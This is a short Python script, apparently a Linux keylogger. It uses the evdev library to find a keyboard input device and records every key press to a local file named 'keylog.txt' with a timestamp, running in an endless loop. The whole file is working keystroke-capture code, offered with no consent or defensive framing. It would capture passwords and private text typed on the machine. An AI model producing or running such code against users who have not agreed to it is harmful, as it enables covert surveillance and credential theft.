from evdev import InputDevice, categorize, ecodes, list_devices
import datetime

# Find keyboard device
devices = [InputDevice(path) for path in list_devices()]
keyboard = None

for device in devices:
    if 'keyboard' in device.name.lower():
        keyboard = device
        break

if not keyboard:
    print("❌ Keyboard device not found.")
    exit(1)

print(f"✅ Listening on {keyboard.path}...")

# Log file
LOG_FILE = "keylog.txt"

with open(LOG_FILE, "a") as log:
    log.write(f"\n\n--- Logging started at {datetime.datetime.now()} ---\n")

# Read keyboard events
for event in keyboard.read_loop():
    if event.type == ecodes.EV_KEY:
        key_event = categorize(event)
        if key_event.keystate == key_event.key_down:
            with open(LOG_FILE, "a") as log:
                log.write(f"{key_event.keycode} ")

